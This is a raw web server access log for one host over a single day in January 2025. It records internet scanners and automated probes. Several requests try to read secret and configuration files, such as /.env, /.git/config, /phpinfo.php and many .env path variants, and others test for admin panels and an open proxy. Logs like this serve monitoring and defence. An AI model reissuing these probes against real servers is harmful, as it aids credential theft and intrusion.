172.202.246.146 - - [09/Jan/2025:00:18:07 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
167.94.138.51 - - [09/Jan/2025:00:30:27 +0000] "\x16\x03\x01" 400 526 "-" "-"
167.94.138.51 - - [09/Jan/2025:00:30:35 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:39 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:41 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:43 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
210.141.211.104 - - [09/Jan/2025:00:32:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [09/Jan/2025:00:43:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.235 - - [09/Jan/2025:01:00:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
40.118.211.231 - - [09/Jan/2025:01:09:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [09/Jan/2025:01:18:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [09/Jan/2025:01:18:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:01:33:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:01:36:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:01:36:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:01:47:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
172.105.128.11 - - [09/Jan/2025:01:48:03 +0000] "\x16\x03\x01" 400 526 "-" "-"
172.206.150.13 - - [09/Jan/2025:02:30:29 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
87.121.79.3 - - [09/Jan/2025:02:48:50 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.223.67.34 - - [09/Jan/2025:02:52:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [09/Jan/2025:02:53:01 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:02:57:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [09/Jan/2025:03:10:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [09/Jan/2025:03:13:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:03:22:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:03:22:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
157.230.223.13 - - [09/Jan/2025:03:29:57 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.8.19"
157.230.223.13 - - [09/Jan/2025:03:46:44 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
35.202.9.133 - - [09/Jan/2025:04:18:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
195.3.223.55 - - [09/Jan/2025:04:27:31 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:04:52:39 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
95.214.53.198 - - [09/Jan/2025:04:54:46 +0000] "GET / HTTP/1.1" 200 1761 "-" "-"
205.210.31.29 - - [09/Jan/2025:05:00:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.89.115.21 - - [09/Jan/2025:05:00:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
78.153.140.93 - - [09/Jan/2025:05:04:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:05:04:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:05:06:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.223.3.201 - - [09/Jan/2025:05:40:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
148.153.56.82 - - [09/Jan/2025:05:40:31 +0000] "GET /hkS6 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:31 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/hkS6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:32 +0000] "GET /mZc3 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/mZc3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:34 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:34 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
198.235.24.35 - - [09/Jan/2025:05:44:10 +0000] "\x16\x03\x01" 400 526 "-" "-"
198.235.24.35 - - [09/Jan/2025:05:44:10 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:05:53:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:05:53:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:06:08:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.91.91.123 - - [09/Jan/2025:06:46:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:06:58:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:06:58:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
221.155.6.128 - - [09/Jan/2025:07:00:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
43.130.14.245 - - [09/Jan/2025:07:06:22 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
18.118.133.247 - - [09/Jan/2025:07:44:05 +0000] "\x16\x03\x01" 400 526 "-" "-"
211.48.126.44 - - [09/Jan/2025:07:45:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.118.133.247 - - [09/Jan/2025:07:45:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
193.34.212.75 - - [09/Jan/2025:07:46:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.120.112.187 - - [09/Jan/2025:07:53:06 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15"
78.153.140.93 - - [09/Jan/2025:08:09:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:08:09:03 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.162.71.210 - - [09/Jan/2025:08:13:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
154.213.184.132 - - [09/Jan/2025:08:14:58 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
117.245.23.231 - - [09/Jan/2025:08:30:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.19.138.234 - - [09/Jan/2025:08:54:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
211.114.78.177 - - [09/Jan/2025:09:18:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:09:21:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:09:21:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
65.49.1.100 - - [09/Jan/2025:09:41:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
185.196.220.253 - - [09/Jan/2025:09:42:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
65.49.1.98 - - [09/Jan/2025:09:44:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
195.3.223.55 - - [09/Jan/2025:09:44:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.52.24.179 - - [09/Jan/2025:09:45:02 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.179 - - [09/Jan/2025:09:45:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [09/Jan/2025:09:45:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.179 - - [09/Jan/2025:09:45:18 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
65.49.1.96 - - [09/Jan/2025:09:45:19 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
164.52.24.179 - - [09/Jan/2025:09:45:22 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
172.104.11.46 - - [09/Jan/2025:09:55:33 +0000] "\x16\x03\x01" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:09:59:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.91.127.81 - - [09/Jan/2025:10:01:20 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 302 350 "-" "Mozilla/5.0"
175.208.86.131 - - [09/Jan/2025:10:33:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.125.126 - - [09/Jan/2025:10:33:46 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:10:34:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:10:34:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.52.234.112 - - [09/Jan/2025:10:36:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
164.52.24.188 - - [09/Jan/2025:11:16:43 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.188 - - [09/Jan/2025:11:17:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [09/Jan/2025:11:17:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.188 - - [09/Jan/2025:11:17:09 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [09/Jan/2025:11:17:12 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
65.20.167.6 - - [09/Jan/2025:11:36:02 +0000] "GET / HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:11:41:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:11:41:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
210.123.159.185 - - [09/Jan/2025:11:54:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
162.216.149.233 - - [09/Jan/2025:11:57:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
210.126.78.152 - - [09/Jan/2025:11:59:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [09/Jan/2025:12:14:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.184.23 - - [09/Jan/2025:12:25:48 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
112.162.189.244 - - [09/Jan/2025:12:43:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
184.105.139.67 - - [09/Jan/2025:12:45:55 +0000] "\x16\x03\x01" 400 526 "-" "-"
91.223.3.201 - - [09/Jan/2025:12:59:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.121.79.3 - - [09/Jan/2025:13:03:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.45.133.14 - - [09/Jan/2025:13:24:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.121.79.3 - - [09/Jan/2025:13:35:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.169.206.199 - - [09/Jan/2025:13:45:30 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
209.58.184.129 - - [09/Jan/2025:13:52:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
193.34.212.75 - - [09/Jan/2025:13:56:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [09/Jan/2025:14:18:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:14:18:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
218.149.155.123 - - [09/Jan/2025:14:25:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.121.79.3 - - [09/Jan/2025:14:28:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [09/Jan/2025:14:52:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
170.106.140.110 - - [09/Jan/2025:14:55:47 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
46.19.138.234 - - [09/Jan/2025:15:09:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [09/Jan/2025:15:11:57 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
218.93.44.86 - - [09/Jan/2025:15:12:17 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
45.83.66.84 - - [09/Jan/2025:15:16:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.93 - - [09/Jan/2025:15:16:25 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.93 - - [09/Jan/2025:15:16:26 +0000] "GET / HTTP/1.1" 200 1002 "http://35.220.248.27:80/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
78.153.140.93 - - [09/Jan/2025:15:35:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:15:35:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:16:00:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
80.82.77.202 - - [09/Jan/2025:16:06:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
139.59.101.104 - - [09/Jan/2025:16:11:11 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
172.168.158.226 - - [09/Jan/2025:16:18:09 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
206.168.34.203 - - [09/Jan/2025:16:20:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.203 - - [09/Jan/2025:16:20:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:47 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:50 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:52 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:16:21:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.76.133.13 - - [09/Jan/2025:16:22:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
193.34.212.75 - - [09/Jan/2025:16:25:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:12 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:12 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:13 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:13 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:16 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:17 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:17 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:19 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:20 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:25 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:28 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
